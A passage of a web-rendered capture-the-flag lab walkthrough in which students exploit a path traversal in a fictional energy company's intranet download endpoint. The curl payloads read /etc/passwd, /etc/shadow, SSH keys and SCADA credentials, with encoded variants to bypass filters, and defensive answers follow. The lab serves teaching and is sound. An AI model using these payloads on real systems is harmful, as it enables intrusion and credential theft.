+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.11  files.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.12  db.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+</div>
+<p>Verify the entries resolve correctly:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Verify hostname resolution</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>intranet.meridian-energy.corp
+</code></pre></div>
+</div>
+<p>You should see ICMP replies from the expected IP address. If the ping times out, verify your VPN connection and check that the IP addresses match your lab assignment.</p>
+<h3 id="step-3-explore-the-intranet-portal">Step 3: Explore the Intranet Portal</h3>
+<p>Open the corporate intranet in your browser or use curl to examine the landing page:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Fetch the intranet landing page</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://intranet.meridian-energy.corp/
+</code></pre></div>
+</div>
+<p>The response should show a login page. The intranet requires authentication before granting access to any internal resources. Look for the login form fields and the form action URL in the HTML source.</p>
+<h3 id="step-4-authenticate-to-the-intranet">Step 4: Authenticate to the Intranet</h3>
+<p>Use Lisa Thornton's Systems Administrator credentials to log in. The login endpoint accepts POST requests with email and password parameters.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Authenticate as Lisa Thornton</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://intranet.meridian-energy.corp/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;email=l.thornton@meridian-energy.corp&amp;password=Lisa2024#&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>-c cookies.txt</code> flag saves the session cookie to a file. Examine the response for a redirect or welcome message. A successful login should redirect you to the dashboard or return a session token.</p>
+<p>Check what the dashboard shows:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Access the intranet dashboard with session cookie</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span>http://intranet.meridian-energy.corp/dashboard
+</code></pre></div>
+</div>
+<p>Look for navigation links, department listings, and any references to a document library or file download feature. The dashboard should present several sections, including a link to the company document repository.</p>
+<h3 id="step-5-browse-the-document-library">Step 5: Browse the Document Library</h3>
+<p>Navigate to the document library section. The intranet organizes documents by category.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Access the document library</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span>http://intranet.meridian-energy.corp/documents
+</code></pre></div>
+</div>
+<p>The response should list document categories such as Safety, Operations, HR, and Engineering. Each document has a download link. Examine the HTML source carefully to identify the URL pattern used for downloads.</p>
+<p>Look for anchor tags or JavaScript calls that reference a download endpoint. The pattern should resemble:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>/download?file=safety/fire-evacuation-plan.txt
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>/download?file=operations/shift-schedule-template.xlsx
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>/download?file=hr/employee-handbook-2024.pdf
+</code></pre></div>
+<p>The <code>file</code> parameter specifies a relative path within the document root. The server prepends <code>/data/documents/</code> to construct the full filesystem path.</p>
+<h3 id="step-6-download-a-legitimate-document">Step 6: Download a Legitimate Document</h3>
+<p>Confirm the download feature works with a valid document path:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Download a legitimate document</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=safety/fire-evacuation-plan.txt&quot;</span>
+</code></pre></div>
+</div>
+<p>The response should contain the text of the fire evacuation plan. Note the content type and format. The server reads the file from disk and returns its contents directly in the HTTP response body, with no additional encoding or transformation.</p>
+<h3 id="step-7-test-for-path-traversal">Step 7: Test for Path Traversal</h3>
+<p>Now test whether the download endpoint validates the file path. Start with a basic traversal attempt to read <code>/etc/passwd</code>:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test path traversal with /etc/passwd</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../../../etc/passwd&quot;</span>
+</code></pre></div>
+</div>
+<p>If the response contains lines in the format <code>username:x:uid:gid:comment:home:shell</code>, path traversal is confirmed. The application is constructing the path as:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>/data/documents/ + ../../../etc/passwd = /etc/passwd
+</code></pre></div>
+<p>The three <code>../</code> sequences traverse up from <code>/data/documents/</code> through <code>/data/</code> and <code>/</code> to the filesystem root, then descend into <code>/etc/passwd</code>.</p>
+<p>Examine the passwd file output. Look for:</p>
+<ul>
+<li><strong>System accounts</strong>: root, www-data, postgres, and other service accounts reveal what software is installed</li>
+<li><strong>User accounts</strong>: Any human user accounts may have home directories with additional files to target</li>
+<li><strong>Shell assignments</strong>: Accounts with <code>/bin/bash</code> or <code>/bin/sh</code> can be logged into; accounts with <code>/usr/sbin/nologin</code> cannot</li>
+</ul>
+<h3 id="step-8-determine-the-directory-structure">Step 8: Determine the Directory Structure</h3>
+<p>Before targeting the secrets directory, confirm the document root path and explore the server's file structure:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read the current process environment to find paths</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../../../proc/self/cmdline&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\0&#39;</span><span class="w"> </span><span class="s1">&#39; &#39;</span>
+</code></pre></div>
+</div>
+<p>The <code>/proc/self/cmdline</code> file reveals the command that started the web application process, which often includes the working directory or configuration file path. The <code>tr '\0' ' '</code> converts null-byte separators to spaces for readability.</p>
+<p>Try reading the application's own configuration or source files to understand the directory layout:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Explore the /data directory listing</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../../etc/hostname&quot;</span>
+</code></pre></div>
+</div>
+<p>Adjusting the number of <code>../</code> sequences helps you understand exactly how deep the document root sits in the filesystem. Two <code>../</code> from <code>/data/documents/</code> reaches <code>/</code>, and then you descend into <code>/etc/hostname</code>.</p>
+<h3 id="step-9-traverse-to-the-secrets-directory">Step 9: Traverse to the Secrets Directory</h3>
+<p>The document root is <code>/data/documents/</code>. The secrets directory sits at <code>/data/secrets/</code>, which is a sibling directory. To reach it, you only need to traverse up one level from the document root and then into <code>secrets/</code>:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - List the contents of the secrets directory</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../secrets/&quot;</span>
+</code></pre></div>
+</div>
+<p>If the server returns a directory listing or error message, you may need to guess filenames. Based on the engagement context (SCADA credentials), try common names:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Attempt to read SCADA credentials file</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../secrets/scada-credentials.txt&quot;</span>
+</code></pre></div>
+</div>
+<p>The response should contain SCADA system credentials, including usernames, passwords, and connection strings for industrial control systems. Among the credentials, look for a flag value in <code>OCR{...}</code> format.</p>
+<h3 id="step-10-try-url-encoded-traversal">Step 10: Try URL-Encoded Traversal</h3>
+<p>If the direct <code>../</code> attempt is blocked by a filter, try URL-encoded variants:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test URL-encoded path traversal</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=%2e%2e/secrets/scada-credentials.txt&quot;</span>
+</code></pre></div>
+</div>
+<p>And double-encoded:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test double-encoded path traversal</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=%252e%252e/secrets/scada-credentials.txt&quot;</span>
+</code></pre></div>
+</div>
+<p>Compare the responses. Some filters decode the input once and check for <code>../</code>, so double encoding (<code>%252e</code> decodes to <code>%2e</code> on first pass, then to <code>.</code> on second pass) can bypass single-decode filters.</p>
+<h3 id="step-11-extract-additional-sensitive-files">Step 11: Extract Additional Sensitive Files</h3>
+<p>With path traversal confirmed, explore what else is accessible. In a real engagement, you would extract as much data as possible to support further attack phases.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read the web application configuration</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../../../etc/shadow&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>/etc/shadow</code> file contains password hashes. If the web application runs as root (a serious misconfiguration), you will see the hashes. If it runs as a non-root user, you will get a permission denied error, which tells you something about the application's privilege level.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for SSH keys</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="s2">&quot;http://intranet.meridian-energy.corp/download?file=../../../root/.ssh/authorized_keys&quot;</span>
+</code></pre></div>
+</div>
+<p>Authorized keys files reveal which SSH public keys grant access to the system. Private keys (if readable) provide direct authentication without passwords.</p>
+<h3 id="step-12-document-and-submit">Step 12: Document and Submit</h3>
+<p>Record the SCADA credentials you extracted and submit the flag on the platform.</p>
+<hr />
+<h2 id="record-your-findings">Record Your Findings</h2>
+<blockquote>
+<p><strong>Intranet download URL pattern:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>(paste the download URL format here)
+</code></pre></div>
+<p><strong>Path traversal confirmation (/etc/passwd excerpt):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>(paste the first 5 lines of /etc/passwd here)
+</code></pre></div>
+<p><strong>Traversal path to secrets directory:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Document root</td>
+<td>/data/documents/</td>
+</tr>
+<tr>
+<td>Traversal payload</td>
+<td></td>
+</tr>
+<tr>
+<td>Target file</td>
+<td></td>
+</tr>
+<tr>
+<td>Full constructed path</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>SCADA credentials extracted:</strong></p>
+<table>
+<thead>
+<tr>
+<th>System</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>How to submit:</strong> enter the flag on the exercise page exactly as you recovered it, keeping the <code>OCR{...}</code> wrapper.</p>
+<p><strong>Flag:</strong> <strong><em>_</em></strong><strong><em>_</em></strong><strong><em>_</em></strong>______</p>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The file server stores documents in <code>/data/documents/</code> and secrets in <code>/data/secrets/</code>. An attacker only needs <code>../secrets/</code> to reach the credentials. What directory structure would make this traversal more difficult?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Storing sensitive files on a completely separate filesystem or volume would prevent traversal from reaching them. If <code>/data/documents/</code> is a mounted volume and <code>/data/secrets/</code> lives on an entirely different mount point (e.g., <code>/opt/secure/secrets/</code>), traversal from the document root cannot reach the secrets regardless of how many <code>../</code> sequences are used within the mount. Additionally, running the web application in a chroot jail or container with only the document directory mounted eliminates filesystem traversal entirely. The sibling directory layout (<code>/data/documents/</code> next to <code>/data/secrets/</code>) is the worst-case scenario because a single <code>../</code> reaches the sensitive files.</p>
+</details>
+<p><strong>2. The application returns the raw file contents in the HTTP response. How would the response differ if the application used a file-streaming approach with proper Content-Disposition headers, and would that prevent the attack?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Adding <code>Content-Disposition: attachment; filename="document.txt"</code> headers would force the browser to download the file rather than display it inline, but would not prevent the attack. The traversal vulnerability exists in the path construction logic, not in how the response is delivered. An attacker using curl or a script ignores Content-Disposition headers entirely. The response would still contain the file contents. Proper defense requires validating the resolved path against an allowlist or verifying it stays within the document root after canonicalization.</p>
+</details>
+<p><strong>3. During the engagement, you used <code>/proc/self/cmdline</code> to learn about the running process. What other files in <code>/proc/self/</code> would be valuable to an attacker exploiting path traversal?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Several <code>/proc/self/</code> files provide valuable intelligence: <code>/proc/self/environ</code> exposes all environment variables (often containing database credentials, API keys, and secret tokens), <code>/proc/self/cwd</code> is a symlink to the current working directory, <code>/proc/self/exe</code> is a symlink to the running binary, <code>/proc/self/fd/</code> contains file descriptors that may point to open log files or database connections, and <code>/proc/self/maps</code> shows memory mappings that reveal loaded libraries and ASLR base addresses. The environment variables file is the highest-value target because applications frequently store secrets in environment variables following the twelve-factor app methodology.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Path traversal exploits insufficient input validation on file path parameters to access files outside the intended directory</li>
+<li>A single <code>../</code> can reach sibling directories; three <code>../</code> sequences from a typical document root reach the filesystem root</li>
+<li>URL encoding (<code>%2e%2e%2f</code>) and double encoding (<code>%252e%252e%252f</code>) bypass naive string-matching filters</li>
+<li>The <code>/proc/self/</code> virtual filesystem exposes process metadata that accelerates exploitation</li>
+<li>Storing sensitive files as siblings to web-accessible directories is a critical architectural mistake</li>
+<li>Canonicalization (resolving the real path) combined with prefix checking is the most reliable server-side defense</li>
+<li>The SCADA credentials extracted through this vulnerability enable the next phase of the engagement</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
